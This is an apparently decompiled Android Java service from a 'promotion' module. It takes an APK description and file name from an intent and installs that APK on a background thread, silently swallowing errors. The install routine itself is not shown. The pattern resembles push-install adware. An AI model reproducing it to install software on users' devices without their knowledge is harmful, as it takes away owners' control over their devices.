package com.zhuoyi.system.promotion.service;

import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import com.zhuoyi.system.network.object.DefinedApkInfo;
import com.zhuoyi.system.promotion.util.PromUtils;
import com.zhuoyi.system.promotion.util.constants.BundleConstants;
import com.zhuoyi.system.service.IZyService;
import com.zhuoyi.system.util.Logger;
import com.zhuoyi.system.util.constant.Session;

public class PromHandleDefinedApkService extends IZyService {
    public PromHandleDefinedApkService(int serviceId, Context c, Handler handler) {
        super(serviceId, c, handler);
    }

    public void onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            final DefinedApkInfo definedApkInfo = (DefinedApkInfo) intent.getSerializableExtra(BundleConstants.BUNDLE_APP_INFO);
            final String fileName = intent.getStringExtra(BundleConstants.BUNDLE_FILE_NAME);
            new Thread(new Runnable() {
                public void run() {
                    try {
                        PromUtils.getInstance(PromHandleDefinedApkService.this.mContext).installDefinedApk(definedApkInfo, fileName);
                    } catch (Exception e) {
                        Logger.error("PromHandlerDefinedApkService", "installDefinedApk error");
                    }
                }
            }).start();
        }
        stopSelf();
    }

    public void onServerAddressReponse(Session session) {
    }
}
